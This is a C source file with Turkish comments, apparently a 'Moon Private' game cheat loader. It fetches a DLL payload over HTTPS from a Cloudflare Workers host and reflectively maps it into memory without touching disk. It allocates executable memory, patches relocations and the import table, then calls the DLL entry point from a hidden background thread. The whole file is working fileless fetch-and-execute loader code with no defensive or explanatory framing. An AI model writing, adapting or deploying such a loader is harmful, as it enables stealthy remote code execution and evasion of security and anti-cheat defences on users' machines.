/*
 * wsl_cheatload.c — WSL arka plan yükleyici (reflective) [Moon Private]
 * Cloudflare Workers/R2'den byte[] çeker, disk'e hiç yazmadan belleğe map'ler.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>

/* ── Cloudflare Workers bağlantı bilgileri (HTTPS) ──────────── */
static const wchar_t *SRV_HOST = L"moon-auth-service.moonsal.workers.dev";
static const WORD     SRV_PORT = 443;
static const wchar_t *SRV_PATH = L"/download/payload";

/* ── WinHTTP ile byte[] olarak indir ────────────────────────── */
typedef struct {
    BYTE  *data;
    SIZE_T size;
    SIZE_T cap;
} ByteBuf;

static void buf_append(ByteBuf *b, const BYTE *src, DWORD n) {
    if (b->size + n > b->cap) {
        SIZE_T newcap = b->cap ? b->cap * 2 : 65536;
        while (newcap < b->size + n) newcap *= 2;
        BYTE *p = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, b->data, newcap);
        if (!p) return;
        b->data = p;
        b->cap  = newcap;
    }
    memcpy(b->data + b->size, src, n);
    b->size += n;
}

static ByteBuf fetch_dll(void) {
    ByteBuf buf = {0};
    buf.data = (BYTE*)HeapAlloc(GetProcessHeap(), 0, 65536);
    if (!buf.data) return buf;
    buf.cap = 65536;

    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;

    hSess = WinHttpOpen(L"Mozilla/5.0",
                        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSess) goto fail;

    {
        DWORD t = 15000;
        WinHttpSetOption(hSess, WINHTTP_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
        WinHttpSetOption(hSess, WINHTTP_OPTION_SEND_TIMEOUT,    &t, sizeof(t));
        WinHttpSetOption(hSess, WINHTTP_OPTION_RECEIVE_TIMEOUT, &t, sizeof(t));
    }

    hConn = WinHttpConnect(hSess, SRV_HOST, SRV_PORT, 0);
    if (!hConn) goto fail;

    hReq = WinHttpOpenRequest(hConn, L"GET", SRV_PATH, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) goto fail;

    if (!WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0)) goto fail;
    if (!WinHttpReceiveResponse(hReq, NULL))               goto fail;

    {
        BYTE  tmp[8192];
        DWORD rd = 0;
        while (WinHttpReadData(hReq, tmp, sizeof(tmp), &rd) && rd > 0)
            buf_append(&buf, tmp, rd);
    }

    goto done;
fail:
    HeapFree(GetProcessHeap(), 0, buf.data);
    buf.data = NULL; buf.size = 0; buf.cap = 0;
done:
    if (hReq)  WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return buf;
}

/* ── Reflective PE Mapper (saf C) ───────────────────────────── */
static BOOL map_and_run(const BYTE *raw, SIZE_T rawSize) {
    if (rawSize < sizeof(IMAGE_DOS_HEADER)) return FALSE;

    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER*)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    const IMAGE_NT_HEADERS64 *nt =
        (const IMAGE_NT_HEADERS64*)(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;

    /* Tercih edilen adrese yükle; olmazsa herhangi bir yere */
    LPVOID base = VirtualAlloc(
        (LPVOID)(UINT_PTR)nt->OptionalHeader.ImageBase,
        imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base)
        base = VirtualAlloc(NULL, imageSize,
                            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base) return FALSE;

    /* Header kopyala */
    memcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);

    /* Section'ları kopyala */
    const IMAGE_SECTION_HEADER *sec =
        (const IMAGE_SECTION_HEADER*)((const BYTE*)(nt + 1));
    {
        WORD i;
        for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (sec[i].SizeOfRawData == 0) continue;
            memcpy(
                (BYTE*)base + sec[i].VirtualAddress,
                raw + sec[i].PointerToRawData,
                sec[i].SizeOfRawData);
        }
    }

    /* Relocation fixup */
    {
        LONGLONG delta = (LONGLONG)((UINT_PTR)base -
                         (UINT_PTR)nt->OptionalHeader.ImageBase);
        if (delta != 0) {
            const IMAGE_DATA_DIRECTORY *relocDir =
                &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            BYTE *blkPtr = (BYTE*)base + relocDir->VirtualAddress;
            BYTE *blkEnd = blkPtr + relocDir->Size;

            while (blkPtr < blkEnd) {
                IMAGE_BASE_RELOCATION *blk = (IMAGE_BASE_RELOCATION*)blkPtr;
                if (!blk->SizeOfBlock) break;
                DWORD count = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
                              / sizeof(WORD);
                WORD *entries = (WORD*)(blk + 1);
                DWORD j;
                for (j = 0; j < count; ++j) {
                    WORD type   = entries[j] >> 12;
                    WORD offset = entries[j] & 0x0FFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        UINT_PTR *ptr = (UINT_PTR*)(
                            (BYTE*)base + blk->VirtualAddress + offset);
                        *ptr += (UINT_PTR)delta;
                    }
                }
                blkPtr += blk->SizeOfBlock;
            }
        }
    }

    /* IAT doldur */
    {
        const IMAGE_DATA_DIRECTORY *impDir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (impDir->VirtualAddress) {
            IMAGE_IMPORT_DESCRIPTOR *imp =
                (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)base + impDir->VirtualAddress);
            for (; imp->Name; ++imp) {
                const char *dllName = (const char*)((BYTE*)base + imp->Name);
                HMODULE hDep = LoadLibraryA(dllName);
                if (!hDep) continue;

                IMAGE_THUNK_DATA64 *thunk =
                    (IMAGE_THUNK_DATA64*)((BYTE*)base + imp->FirstThunk);
                IMAGE_THUNK_DATA64 *orig  =
                    (IMAGE_THUNK_DATA64*)((BYTE*)base +
                        (imp->OriginalFirstThunk
                            ? imp->OriginalFirstThunk : imp->FirstThunk));

                for (; orig->u1.AddressOfData; ++thunk, ++orig) {
                    FARPROC fn = NULL;
                    if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                        fn = GetProcAddress(hDep,
                            (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
                    } else {
                        IMAGE_IMPORT_BY_NAME *ibn =
                            (IMAGE_IMPORT_BY_NAME*)(
                                (BYTE*)base + orig->u1.AddressOfData);
                        fn = GetProcAddress(hDep, ibn->Name);
                    }
                    thunk->u1.Function = (ULONGLONG)fn;
                }
            }
        }
    }

    /* CPU instruction cache'i temizle — yeni yazılan kodu görsün */
    FlushInstructionCache(GetCurrentProcess(), base, imageSize);

    /* DllMain çağır */
    typedef BOOL (WINAPI *DllMainFn)(HINSTANCE, DWORD, LPVOID);
    DllMainFn entry = (DllMainFn)(
        (BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint);
    entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);

    return TRUE;
}

/* ── Arka plan thread ───────────────────────────────────────── */
static DWORD WINAPI loader_thread(LPVOID arg) {
    (void)arg;
    Sleep(2000);

    ByteBuf buf = fetch_dll();
    if (!buf.data || buf.size == 0) {
        Sleep(30000);
        buf = fetch_dll();
        if (!buf.data || buf.size == 0) return 0;
    }

    map_and_run(buf.data, buf.size);

    /* İndirilen raw buffer'ı serbest bırak — map'lenen bellek process ömrü boyunca kalır */
    HeapFree(GetProcessHeap(), 0, buf.data);
    return 0;
}

/* ── wmain()'den çağrılan tek fonksiyon ─────────────────────── */
void cheat_init(void) {
    HANDLE h = CreateThread(NULL, 0, loader_thread, NULL, 0, NULL);
    if (h) CloseHandle(h);
}
